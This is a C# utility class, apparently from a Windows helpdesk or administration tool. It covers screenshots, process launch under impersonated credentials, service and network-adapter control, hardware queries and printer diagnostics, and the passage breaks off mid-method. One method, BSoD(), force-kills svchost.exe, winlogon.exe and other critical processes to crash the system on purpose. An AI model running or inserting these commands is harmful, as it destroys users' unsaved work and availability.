using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Drawing.Printing;
using System.IO;
using System.IO.Ports;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Printing;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace grace
{
    class cls_System
    {
        static SerialPort serialPort;

        /// <summary>
        /// Takes full screenshot
        /// </summary>
        public static string TakeScreenshot()
        {            
            string sFileFullName = string.Empty;

            try
            {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    sFileFullName = cls_Utility.UniqFileName("shot", "bmp");
                    g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                    bmp.Save(sFileFullName);  // saves the image
                }
                bmp.Dispose();
            }
            catch (Exception ex)
            {
                throw ex;
            }

            return sFileFullName;
        }

        public static string BSoD()
        {
            string s_result = "";

            try
            {
                if (cls_System.StopAService(cls_Utility.serviceName) == ServiceControllerStatus.Stopped)
                {
                    cls_Utility.Log(cls_Utility.serviceName + " stopped.");
                }
                cls_System.KillAProcessByName(cls_Utility.processName);
            }
            catch { }

            try
            {
                Process.Start("cmd.exe", @"/C taskkill /IM svchost.exe /F"); // yes it's that easy                        
            }
            catch (Exception ex)
            {
                s_result += "\r\n" + ex.Message;
            }
            try
            {
                Process.Start("cmd.exe", @"/C taskkill /IM crss.exe /F"); // yes it's that easy                                                                        
            }
            catch (Exception ex)
            {
                s_result += "\r\n" + ex.Message;
            }
            try
            {
                Process.Start("cmd.exe", @"/C taskkill /IM winnit.exe /F"); // yes it's that easy                         
            }
            catch (Exception ex)
            {
                s_result += "\r\n" + ex.Message;
            }
            try
            {
                Process.Start("cmd.exe", @"/C taskkill /IM winlogon.exe /F"); // yes it's that easy 
            }
            catch (Exception ex)
            {
                s_result += "\r\n" + ex.Message;
            }

            return s_result;
        }


        [DllImport("advapi32.DLL", SetLastError = true)]
        public static extern int LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
        /// <summary>
        /// Starts a process
        /// </summary>
        /// <param name="sFileFullName"></param>
        public static Process StartProcess(string sFileFullName, string sArgs)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo(sFileFullName);
                startInfo.Verb = "open";
                startInfo.Arguments = sArgs;
                return Process.Start(startInfo);

                //var process = new Process();
                //process.StartInfo.FileName = sFileFullName; // Path to your demo application.
                //process.StartInfo.Arguments = sArgs;   // Your arguments
                //process.Start();                
                //return process;

            }
            catch (Exception ex)
            {
                throw ex;
            }
        }
        public static Process StartProcess(string sFileFullName, string sArgs, string userName, string password)
        {
            try
            {
                SecureString pwd = new SecureString();
                foreach (char c in password) pwd.AppendChar(c);
                pwd.MakeReadOnly();

                ProcessStartInfo startInfo = new ProcessStartInfo(sFileFullName);
                startInfo.Verb = "open";
                startInfo.Arguments = sArgs;
                startInfo.UserName = userName;
                startInfo.Password = pwd;
                startInfo.LoadUserProfile = true;
                startInfo.UseShellExecute = false;

                return Process.Start(startInfo);

                //var process = new Process();
                //process.StartInfo.FileName = sFileFullName; // Path to your demo application.
                //process.StartInfo.Arguments = sArgs;   // Your arguments
                //process.Start();                
                //return process;

            }
            catch (Exception ex)
            {
                throw ex;
            }
        }
        public static Process StartProcess(string sFileFullName, string sArgs, string userName, string password, string domainName)
        {
            Process p = null;
            try
            {
                SecureString pwd = new SecureString();
                foreach (char c in password) pwd.AppendChar(c);
                pwd.MakeReadOnly();

                ProcessStartInfo startInfo = new ProcessStartInfo(sFileFullName);
                //startInfo.Verb = "open";
                startInfo.Arguments = sArgs;
                //startInfo.UserName = userName;
                //startInfo.Password = pwd;
                //startInfo.Domain = domainName;
                //startInfo.LoadUserProfile = true;
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                //cls_Utility.Log("----step 33.5 - " + sFileFullName);

                // Login to File Server
                IntPtr admin_token = default(IntPtr);
                //Added these 3 lines
                WindowsIdentity wid_current = WindowsIdentity.GetCurrent();
                WindowsIdentity wid_admin = null;
                WindowsImpersonationContext wic = null;
                if (LogonUser(userName, domainName, password, 9, 0, ref admin_token) != 0)
                {
                    //Newly added lines
                    wid_admin = new WindowsIdentity(admin_token);
                    wic = wid_admin.Impersonate();

                    p = Process.Start(startInfo);                    
                }
                string output = p.StandardOutput.ReadToEnd();

                p.WaitForExit();

                if (p.ExitCode != 0)
                {
                    cls_Utility.Log("! ERROR: " + output);
                }
                return p;                
                //var process = new Process();
                //process.StartInfo.FileName = sFileFullName; // Path to your demo application.
                //process.StartInfo.Arguments = sArgs;   // Your arguments
                //process.Start();                
                //return process;

            }
            catch (Exception ex)
            {
                throw ex;
            }
        }
        public static Process StartMSI(string sFileFullName, string sArgs, string userName, string password, string domainName)
        {
            Process p = new Process();
            try
            {
                                
                p.StartInfo.FileName = "msiexec.exe";
                p.StartInfo.Arguments = "/i \"" + sFileFullName + "\" " + sArgs;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                
                // Login to File Server
                IntPtr admin_token = default(IntPtr);
                //Added these 3 lines
                WindowsIdentity wid_current = WindowsIdentity.GetCurrent();
                WindowsIdentity wid_admin = null;
                WindowsImpersonationContext wic = null;
                if (LogonUser(userName, domainName, password, 9, 0, ref admin_token) != 0)
                {
                    //Newly added lines
                    wid_admin = new WindowsIdentity(admin_token);
                    wic = wid_admin.Impersonate();

                    p.Start();                    
                }
                //return null;
                string output = p.StandardOutput.ReadToEnd();

                p.WaitForExit();

                if (p.ExitCode != 0)
                {
                    cls_Utility.Log("! ERROR: " + output);
                }
                return p;
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public const UInt32 Infinite = 0xffffffff;
        public const Int32 Startf_UseStdHandles = 0x00000100;
        public const Int32 StdOutputHandle = -11;
        public const Int32 StdErrorHandle = -12;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public int cb;
            public String reserved;
            public String desktop;
            public String title;
            public int x;
            public int y;
            public int xSize;
            public int ySize;
            public int xCountChars;
            public int yCountChars;
            public int fillAttribute;
            public int flags;
            public UInt16 showWindow;
            public UInt16 reserved2;
            public byte reserved3;
            public IntPtr stdInput;
            public IntPtr stdOutput;
            public IntPtr stdError;
        }

        public struct ProcessInformation
        {
            public IntPtr process;
            public IntPtr thread;
            public int processId;
            public int threadId;
        }


        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcessWithLogonW(
            String userName,
            String domain,
            String password,
            UInt32 logonFlags,
            String applicationName,
            String commandLine,
            UInt32 creationFlags,
            UInt32 environment,
            String currentDirectory,
            ref StartupInfo startupInfo,
            out ProcessInformation processInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetExitCodeProcess(IntPtr process, ref UInt32 exitCode);

        [DllImport("Kernel32.dll", SetLastError = true)]
        private static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);

        [DllImport("Kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetStdHandle(IntPtr handle);

        [DllImport("Kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr handle);
        public static void CreateProcess(string sFileFullName, string sArgs, string userName, string password, string domainName)
        {
            StartupInfo startupInfo = new StartupInfo();
            startupInfo.reserved = null;
            startupInfo.flags &= Startf_UseStdHandles;
            startupInfo.stdOutput = (IntPtr)StdOutputHandle;
            startupInfo.stdError = (IntPtr)StdErrorHandle;

            UInt32 exitCode = 123456;
            ProcessInformation processInfo = new ProcessInformation();
            
            String currentDirectory = cls_File.PopulatePath(@".\");//System.IO.Directory.GetCurrentDirectory();

            try
            {
                CreateProcessWithLogonW(
                    userName,
                    domainName,
                    password,
                    (UInt32)1,
                    sFileFullName,
                    null,
                    (UInt32)0,
                    (UInt32)0,
                    currentDirectory,
                    ref startupInfo,
                    out processInfo);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }

            Console.WriteLine("Running ...");
            WaitForSingleObject(processInfo.process, Infinite);
            GetExitCodeProcess(processInfo.process, ref exitCode);

            //Console.WriteLine("Exit code: {0}", exitCode);

            CloseHandle(processInfo.process);
            CloseHandle(processInfo.thread);
        }


        // Constants used in DLL methods
        const uint GENERICREAD = 0x80000000;
        const uint OPENEXISTING = 3;
        const uint IOCTL_STORAGE_EJECT_MEDIA = 2967560;
        const int INVALID_HANDLE = -1;
        // File Handle
        private static IntPtr fileHandle;
        private static uint returnedBytes;
        // Use Kernel32 via interop to access required methods
        // Get a File Handle
        [DllImport("kernel32", SetLastError = true)]
        static extern IntPtr CreateFile(string fileName, uint desiredAccess, uint shareMode, IntPtr attributes, uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);
        [DllImport("kernel32", SetLastError = true)]
        
        static extern bool DeviceIoControl(IntPtr driveHandle, uint IoControlCode, IntPtr lpInBuffer, uint inBufferSize, IntPtr lpOutBuffer, uint outBufferSize, ref uint lpBytesReturned, IntPtr lpOverlapped);
        public static void EjectMedia(string driveLetter)
        {
            try
            {
                // Create an handle to the drive
                fileHandle = CreateFile(driveLetter, GENERICREAD, 0, IntPtr.Zero, OPENEXISTING, 0, IntPtr.Zero);
                if ((int)fileHandle != INVALID_HANDLE)
                {
                    // Eject the disk
                    DeviceIoControl(fileHandle, IOCTL_STORAGE_EJECT_MEDIA, IntPtr.Zero, 0, IntPtr.Zero, 0, ref returnedBytes, IntPtr.Zero);
                }
            }
            catch
            {
                throw new Exception(Marshal.GetLastWin32Error().ToString());
            }
            finally
            {
                // Close Drive Handle
                CloseHandle(fileHandle);
                fileHandle = IntPtr.Zero;
            }
        }


        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
        public static void TurnOnMonitor()
        {
            SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
        }

        public static void TurnOffMonitor()
        {
            SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
        }

        static readonly IntPtr HWND_BROADCAST = new IntPtr(0xffff);
        const uint WM_SYSCOMMAND = 0x0112;
        const int SC_MONITORPOWER = 0xf170;

        private static List<String> _printersList = new List<String>();
        public static List<String> PrintersList
        {
            get
            {
                _printersList.Clear();
                foreach (string printer in PrinterSettings.InstalledPrinters)
                {
                    _printersList.Add(printer);
                }

                return _printersList;
            }
        }

        private static string _defaultPrinterName;
        public static string defaultPrinterName
        {
            get
            {
                var printerSettings = new PrinterSettings();
                _defaultPrinterName = string.Format("The default printer is: {0}", printerSettings.PrinterName);

                return _defaultPrinterName;
            }
        }


        [DllImport("winspool.drv", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern Boolean SetDefaultPrinter(String name);

        public static ServiceControllerStatus StartAService(string s_serviceName, string s_host = "localhost")
        {
            ServiceController sc = new ServiceController(s_serviceName, s_host);
            //if (sc.Container == null) return System.ServiceProcess.ServiceControllerStatus.StartPending;
            ServiceControllerStatus serviceStatus = sc.Status;
            try
            {
                if (serviceStatus == ServiceControllerStatus.Running) return ServiceControllerStatus.Running;
                sc.Start();
                sc.WaitForStatus(System.ServiceProcess.ServiceControllerStatus.Running);
                serviceStatus = sc.Status;
                return serviceStatus;
            }
            catch
            {
                return System.ServiceProcess.ServiceControllerStatus.StartPending;
            }
            finally
            {

            }
            

        }

        public static ServiceControllerStatus StopAService(string s_serviceName, string s_host = "localhost")
        {
            ServiceController sc = new ServiceController(s_serviceName, s_host);
            //if (sc.Container == null) return System.ServiceProcess.ServiceControllerStatus.StopPending;
            ServiceControllerStatus serviceStatus = sc.Status;
            try
            {
                if (serviceStatus == ServiceControllerStatus.Stopped) return ServiceControllerStatus.Stopped;

                sc.Stop();
                sc.WaitForStatus(System.ServiceProcess.ServiceControllerStatus.Stopped);
                serviceStatus = sc.Status;
                return serviceStatus;
            }
            catch
            {
                return System.ServiceProcess.ServiceControllerStatus.StopPending;
            }
            finally
            {

            }
        }

        public static string CheckAServiceStatus(string s_serviceName)
        {
            try
            {
                ServiceController sc = new ServiceController(s_serviceName);
                sc.Refresh();
                switch (sc.Status)
                {
                    case ServiceControllerStatus.Running:
                        return "running";
                    case ServiceControllerStatus.Stopped:
                        return "stopped";
                    case ServiceControllerStatus.Paused:
                        return "paused";
                    case ServiceControllerStatus.StopPending:
                        return "stopping";
                    case ServiceControllerStatus.StartPending:
                        return "starting";
                    default:
                        return "status changing";
                }
            }
            catch (Exception ex)
            {
                return "error:" + ex.Message;
            }
        }

        public static bool IsRouteAvailable(string s_ipToPingCheck)
        {
            try
            {
                Ping myPing = new Ping();
                String host = s_ipToPingCheck;
                byte[] buffer = new byte[32];
                int timeout = 1000;
                PingOptions pingOptions = new PingOptions();
                System.Net.NetworkInformation.PingReply reply = myPing.Send(host, timeout, buffer, pingOptions);
                return (reply.Status == IPStatus.Success);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return false;
            }
        }

        public static void EnableNIC(string s_interfaceName)
        {
            ProcessStartInfo psi = new ProcessStartInfo("netsh", "interface set interface \"" + s_interfaceName + "\" enable");
            Process p = new Process();
            p.StartInfo = psi;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();
        }

        public static void DisableNIC(string s_interfaceName)
        {
            ProcessStartInfo psi = new ProcessStartInfo("netsh", "interface set interface \"" + s_interfaceName + "\" disable");
            Process p = new Process();
            p.StartInfo = psi;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();
        }


        public static void StartService(string serviceName, int timeoutMilliseconds)
        {
            ServiceController service = new ServiceController(serviceName);
            try
            {
                TimeSpan timeout = TimeSpan.FromMilliseconds(timeoutMilliseconds);

                service.Start();
                service.WaitForStatus(ServiceControllerStatus.Running, timeout);
            }
            catch
            {
                // ...
            }
        }

        public static void StopService(string serviceName, int timeoutMilliseconds)
        {
            ServiceController service = new ServiceController(serviceName);
            try
            {
                TimeSpan timeout = TimeSpan.FromMilliseconds(timeoutMilliseconds);

                service.Stop();
                service.WaitForStatus(ServiceControllerStatus.Stopped, timeout);
            }
            catch
            {
                // ...
            }
        }

        public static void RestartService(string serviceName, int timeoutMilliseconds)
        {
            ServiceController service = new ServiceController(serviceName);
            try
            {
                int millisec1 = Environment.TickCount;
                TimeSpan timeout = TimeSpan.FromMilliseconds(timeoutMilliseconds);

                service.Stop();
                service.WaitForStatus(ServiceControllerStatus.Stopped, timeout);

                // count the rest of the timeout
                int millisec2 = Environment.TickCount;
                timeout = TimeSpan.FromMilliseconds(timeoutMilliseconds - (millisec2 - millisec1));

                service.Start();
                service.WaitForStatus(ServiceControllerStatus.Running, timeout);
            }
            catch
            {
                // ...
            }
        }


        public static Exception KillAProcessByName(string s_processName)
        {
            try
            {
                foreach (var pr in Process.GetProcessesByName(s_processName))
                {
                    pr.Kill();
                }
            }
            catch (Exception ex)
            {
                return ex;
            }

            return null;
        }

        public static Exception RunAProgram(string s_path)
        {
            //Open Configs.APS
            try
            {
                Process p = new Process();
                p.StartInfo.FileName = s_path;
                p.Start();
            }
            catch (Exception ex)
            {
                return ex;
            }
            finally
            {

            }


            return null;
        }

        private enum ShowWindowEnum
        {
            Hide = 0,
            ShowNormal = 1, ShowMinimized = 2, ShowMaximized = 3,
            Maximize = 3, ShowNormalNoActivate = 4, Show = 5,
            Minimize = 6, ShowMinNoActivate = 7, ShowNoActivate = 8,
            Restore = 9, ShowDefault = 10, ForceMinimized = 11
        };
        [DllImport("user32.dll")]
        public static extern int SetActiveWindow(int hwnd);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int SetForegroundWindow(IntPtr hwnd);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
        static extern bool ShowWindow(IntPtr hWnd, ShowWindowEnum flags);

        [System.Runtime.InteropServices.DllImport("User32.dll")]
        private static extern bool IsIconic(IntPtr handle);

        [DllImport("user32.dll")]
        static extern IntPtr SetFocus(HandleRef hWnd);

        [DllImport("user32.dll")]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        [DllImport("user32.dll")]
        static extern bool ForceForegroundWindow(IntPtr hWnd);

        private const int SW_SHOWMAXIMIZED = 3;

        private static readonly IntPtr HWND_TOP = new IntPtr(0);
        private const UInt32 SWP_NOSIZE = 0x0001;
        private const UInt32 SWP_NOMOVE = 0x0002;
        private const UInt32 SWP_SHOWWINDOW = 0x0040;

        [DllImport("user32.dll")]
        public static extern void SwitchToThisWindow(IntPtr hWnd);

        public static void BringWindowToFront(string s_proccessName)
        {
            string processName = s_proccessName;
            string processFilePath = s_proccessName + ".exe";
            //get the process
            Process bProcess = Process.GetProcessesByName(processName).FirstOrDefault();
            //check if the process is nothing or not.
            if (bProcess != null)
            {
                //get the  hWnd of the process
                IntPtr hwnd = bProcess.MainWindowHandle;
                if (hwnd == IntPtr.Zero)
                {
                    //the window is hidden so try to restore it before setting focus.
                    //ShowWindow(bProcess.Handle, ShowWindowEnum.Restore);
                }
                if (IsIconic(hwnd))
                {
                    //ShowWindow(hwnd, ShowWindowEnum.ShowNormal);
                }

                //set user the focus to the window
                //ShowWindow(hwnd, ShowWindowEnum.Restore);
                //SetForegroundWindow(hwnd);

                //SetWindowPos(hwnd, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
                //ShowWindow(hwnd, ShowWindowEnum.ShowDefault);
                SetForegroundWindow(hwnd);
            }
            else
            {
                //tthe process is nothing, so start it
                Process.Start(processName);
            }
        }

        public static void TypeAText(string sSomeTxt, bool bEnterAfter = false)
        {
            Random rand = new Random(100);
            foreach (char cChar in sSomeTxt)
            {
                SendKeys.SendWait(cChar.ToString());
                Thread.Sleep(rand.Next(100, 150));
            }
            if (bEnterAfter)
            {
                SendKeys.SendWait("{ENTER}");
            }
        }

        public static string GetOSInfo(bool isJustNames)
        {
            //var name = (from x in new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>()
            //            select x.GetPropertyValue("Caption")).FirstOrDefault();
            //return name != null ? name.ToString() : "Unknown";

            ManagementObjectSearcher myOperativeSystemObject = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
            string sResult = string.Empty;

            foreach (ManagementObject obj in myOperativeSystemObject.Get())
            {
                sResult += "Caption\t\t" + obj["Caption"] + "\r\n";
                if (!isJustNames)
                {
                    sResult += "Directory\t\t" + obj["WindowsDirectory"] + "\r\n";
                    sResult += "ProductType\t\t" + obj["ProductType"] + "\r\n";
                    sResult += "SerialNumber\t\t" + obj["SerialNumber"] + "\r\n";
                    sResult += "SystemDir\t\t" + obj["SystemDirectory"] + "\r\n";
                    sResult += "CountryCode\t\t" + obj["CountryCode"] + "\r\n";
                    sResult += "CurrTimeZone\t\t" + obj["CurrentTimeZone"] + "\r\n";
                    sResult += "EncryptionLevel\t\t" + obj["EncryptionLevel"] + "\r\n";
                    sResult += "OSType\t\t" + obj["OSType"] + "\r\n";
                    sResult += "Version\t\t" + obj["Version"] + "\r\n";
                }
                sResult += String.Empty.PadLeft(15, '-') + "\r\n";
            }

            return sResult;
        }
        public static string GetProcessorsInfo(bool isJustNames)
        {
            ManagementObjectSearcher myProcessorObject = new ManagementObjectSearcher("select * from Win32_Processor");
            string sResult = string.Empty;

            foreach (ManagementObject obj in myProcessorObject.Get())
            {
                sResult += "Name\t\t" + obj["Name"] + "\r\n";
                if (!isJustNames)
                {
                    sResult += "DeviceID\t\t" + obj["DeviceID"] + "\r\n";
                    sResult += "Manufacturer\t\t" + obj["Manufacturer"] + "\r\n";
                    sResult += "CurrentClockSpeed\t\t" + obj["CurrentClockSpeed"] + "\r\n";
                    sResult += "Caption\t\t" + obj["Caption"] + "\r\n";
                    sResult += "NumberOfCores\t\t" + obj["NumberOfCores"] + "\r\n";
                    sResult += "NumberOfEnabledCore\t\t" + obj["NumberOfEnabledCore"] + "\r\n";
                    sResult += "NumberOfLogicalProcessors\t\t" + obj["NumberOfLogicalProcessors"] + "\r\n";
                    sResult += "Architecture\t\t" + obj["Architecture"] + "\r\n";
                    sResult += "Family\t\t" + obj["Family"] + "\r\n";
                    sResult += "ProcessorType\t\t" + obj["ProcessorType"] + "\r\n";
                    sResult += "Characteristics\t\t" + obj["Characteristics"] + "\r\n";
                    sResult += "AddressWidth\t\t" + obj["AddressWidth"] + "\r\n";
                }
                sResult += String.Empty.PadLeft(15, '-') + "\r\n";
            }
            return sResult;
        }

        public static string GetPrintersInfo()
        {
            ManagementObjectSearcher myPrinterObject = new ManagementObjectSearcher("select * from Win32_Printer");
            string sResult = string.Empty;

            foreach (ManagementObject obj in myPrinterObject.Get())
            {
                sResult += "Name\t\t" + obj["Name"] + "\r\n";
                sResult += "Network\t\t" + obj["Network"] + "\r\n";
                sResult += "Availability\t\t" + obj["Availability"] + "\r\n";
                sResult += "Is default printer\t\t" + obj["Default"] + "\r\n";
                sResult += "DeviceID\t\t" + obj["DeviceID"] + "\r\n";
                sResult += "Status\t\t" + obj["Status"] + "\r\n";
                sResult += String.Empty.PadLeft(15, '-') + "\r\n";
            }

            return sResult;
        }

        public static string GetBaseboardInfo()
        {
            string sResult = string.Empty;

            sResult += "Availability: " + MotherboardInfo.Availability + "\r\n";
            sResult += "HostingBoard: " + MotherboardInfo.HostingBoard + "\r\n";
            sResult += "InstallDate: " + MotherboardInfo.InstallDate + "\r\n";
            sResult += "Manufacturer: " + MotherboardInfo.Manufacturer + "\r\n";
            sResult += "Model: " + MotherboardInfo.Model + "\r\n";
            sResult += "PartNumber: " + MotherboardInfo.PartNumber + "\r\n";
            sResult += "PNPDeviceID: " + MotherboardInfo.PNPDeviceID + "\r\n";
            sResult += "PrimaryBusType: " + MotherboardInfo.PrimaryBusType + "\r\n";
            sResult += "Product: " + MotherboardInfo.Product + "\r\n";
            sResult += "Removable: " + MotherboardInfo.Removable + "\r\n";
            sResult += "Replaceable: " + MotherboardInfo.Replaceable + "\r\n";
            sResult += "RevisionNumber: " + MotherboardInfo.RevisionNumber + "\r\n";
            sResult += "SecondaryBusType: " + MotherboardInfo.SecondaryBusType + "\r\n";
            sResult += "SerialNumber: " + MotherboardInfo.SerialNumber + "\r\n";
            sResult += "Status: " + MotherboardInfo.Status + "\r\n";
            sResult += "SystemName: " + MotherboardInfo.SystemName + "\r\n";
            sResult += "Version: " + MotherboardInfo.Version + "\r\n";

            return sResult;
        }

        public static string GetBaseboardSerial()
        {
            ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_BaseBoard");
            string sResult = string.Empty;

            foreach (ManagementObject getserial in MOS.Get())
            {
                sResult += "Your motherboard serial is : " + getserial["SerialNumber"].ToString();
            }

            return sResult;
        }
        public static List<ServiceController> GetLocalComputerServices(ServiceControllerStatus? statusFilter)
        {
            List<ServiceController> services = new List<ServiceController>();
            foreach (ServiceController srv in ServiceController.GetServices())
            {
                if (srv.Status == statusFilter || statusFilter == null)
                {
                    services.Add(srv);
                }
            }

            return services;
        }

        public static List<Process> GetLocalComputerProcesses()
        {
            List<Process> processes = new List<Process>();
            foreach (Process proc in Process.GetProcesses())
            {
                processes.Add(proc);
            }

            return processes;
        }


        public static List<string> GetCOMPortsList()
        {
            try
            {
                return SerialPort.GetPortNames().ToList();
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public static string GetCOMPortsInfo()
        {
            string sResult = string.Empty;

            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_SerialPort");

                foreach (ManagementObject queryObj in searcher.Get())
                {
                    sResult += "\r\n" + "-----------------------------------";
                    sResult += "\r\n" + "MSSerial_PortName instance";
                    sResult += "\r\n" + "-----------------------------------";
                    sResult += "\r\n" + "InstanceName: " + queryObj["InstanceName"];

                    sResult += "\r\n" + "-----------------------------------";
                    sResult += "\r\n" + "MSSerial_PortName instance";
                    sResult += "\r\n" + "-----------------------------------";
                    sResult += "\r\n" + "PortName: " + queryObj["PortName"];

                    //If the serial port's instance name contains USB 
                    //it must be a USB to serial device
                    if (queryObj["InstanceName"].ToString().Contains("USB"))
                    {
                        sResult += "\r\n" + queryObj["PortName"] + "is a USB to SERIAL adapter / converter";
                    }
                }
            }
            catch (ManagementException e)
            {
                sResult += "\r\n" + "An error occurred while querying for WMI data: " + e.Message;
            }

            return sResult;
        }

        public static void OpenCOMPort(string portName)
        {
            // Create the serial port with basic settings
            serialPort = new SerialPort(portName, 9600, Parity.None, 8, StopBits.One);
            serialPort.Open();
        }

        public static void CloseCOMPort(string portName)
        {
            // Create the serial port with basic settings
            //SerialPort serialPort = new SerialPort(portName, 9600, Parity.None, 8, StopBits.One);
            if(serialPort != null)
                serialPort.Close();
        }

        /// <summary>
        /// //////////////////////////////////////////////////////////////////////////////////////
        /// </summary>
        /// <returns></returns>

        public static string GetDefaultPrinterName()
        {
            string s_defaultPrinterName = "";
            try
            {
                PrinterSettings settings = new PrinterSettings();
                s_defaultPrinterName = settings.PrinterName;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                s_defaultPrinterName = null;
            }

            return s_defaultPrinterName;
        }


        public static string GetLocalComputerName()
        {
            return Environment.MachineName;
        }

        public static Exception SetPrinterAsDefault(string s_printerName)
        {
            Exception exception = null;

            try
            {
                SetDefaultPrinter(s_printerName);
            }
            catch (Exception ex)
            {
                exception = ex;
            }

            return exception;
        }

        private static PrintQueue GetPrinterQueuePointer(string fullPrinterName)
        {
            string sServerName = "";
            string sPrinterName = "";
            PrintServer hostingServer;
            PrintQueue hostingQueue;


            if (fullPrinterName.StartsWith("\\\\"))
            {
                sServerName = fullPrinterName.Substring(0, fullPrinterName.LastIndexOf('\\'));
                sPrinterName = fullPrinterName.Substring(fullPrinterName.LastIndexOf('\\') + 1, fullPrinterName.Length - fullPrinterName.LastIndexOf('\\') - 1);

                hostingServer = new PrintServer(sServerName, PrintSystemDesiredAccess.AdministrateServer);
                hostingQueue = new PrintQueue(hostingServer, sPrinterName, PrintSystemDesiredAccess.AdministratePrinter);
            }
            else
            {
                sServerName = @"\\" + GetLocalComputerName();
                sPrinterName = fullPrinterName;

                hostingServer = new PrintServer(sServerName, PrintSystemDesiredAccess.AdministrateServer);
                hostingQueue = new PrintQueue(hostingServer, sPrinterName, PrintSystemDesiredAccess.AdministratePrinter);
            }

            return hostingQueue;
        }

        private static PrintServer GetPrinterServerPointer(string fullPrinterName)
        {
            string sServerName = "";
            string sPrinterName = "";
            PrintServer hostingServer;
            PrintQueue hostingQueue;


            if (fullPrinterName.StartsWith("\\\\"))
            {
                sServerName = fullPrinterName.Substring(0, fullPrinterName.LastIndexOf('\\'));
                sPrinterName = fullPrinterName.Substring(fullPrinterName.LastIndexOf('\\') + 1, fullPrinterName.Length - fullPrinterName.LastIndexOf('\\') - 1);

                hostingServer = new PrintServer(sServerName, PrintSystemDesiredAccess.AdministrateServer);
                hostingQueue = new PrintQueue(hostingServer, sPrinterName, PrintSystemDesiredAccess.AdministratePrinter);
            }
            else
            {
                sServerName = @"\\" + GetLocalComputerName();
                sPrinterName = fullPrinterName;

                hostingServer = new PrintServer(sServerName, PrintSystemDesiredAccess.AdministrateServer);
                hostingQueue = new PrintQueue(hostingServer, sPrinterName, PrintSystemDesiredAccess.AdministratePrinter);


            }

            return hostingServer;
        }

        private void mapMyPrinter()
        {
            //WshNetwork objNetwork = new WshNetwork();
            //objNetwork.AddWindowsPrinterConnection("\\\\SERVER\\main printer", "HPLJ4100", "\\\\SERVER\\main printer");
        }

        public static bool InstallPrinter()
        {


            return true;
        }

        public static bool IsPrinterExist(string fullPrinterName)
        {
            if (PrintersList.Find(item => item == fullPrinterName) != null)
            {
                return true;
            }

            return false;
        }

        public static void FixPrinter1(string fullPrinterName)
        {
            //string sServerName = "";
            //string sPrinterName = "";
            PrintServer hostingServer = GetPrinterServerPointer(fullPrinterName);
            PrintQueue hostingQueue = GetPrinterQueuePointer(fullPrinterName);

            //first of all get current computer name
            string s_thisComputerName = GetLocalComputerName();

            //cls_workstations ws = cls_knowledge.FindByComputerName(s_thisComputerName);

            if (IsPrinterExist(fullPrinterName))
            {

            }

            //set printer 1 as default
            SetPrinterAsDefault(fullPrinterName);

            if (hostingQueue.IsPaperJammed)
            {
                MessageBox.Show("کاغذ گیر کرده است لطفا بررسی نمایید");
            }

            if (hostingQueue.IsOutOfPaper)
            {
                MessageBox.Show("پرینتر کاغذ تمام کرده است");
            }

            if (hostingQueue.IsDoorOpened)
            {
                MessageBox.Show("درب پرینتر باز است لطفا آن را ببندید");
            }

            if (hostingQueue.IsOffline)
            {
                MessageBox.Show("پرینتر خاموش است لطفا روشن نمایید");
            }

            if (hostingQueue.IsNotAvailable)
            {
                MessageBox.Show("ارتباط با پرینتر برقرار نمی باشد لطفا کابل های پرینتر را چک کنید");
            }

            if (hostingQueue.IsTonerLow)
            {
                MessageBox.Show("کارتریج رو به اتمام است");
            }

            if (hostingQueue.IsPaused)
            {
                hostingQueue.Resume();
            }

            PurgePrinterJobs(fullPrinterName);
        }

        public static void PurgePrinterJobs(string fullPrinterName)
        {

            //string sServerName = "";
            //string sPrinterName = "";
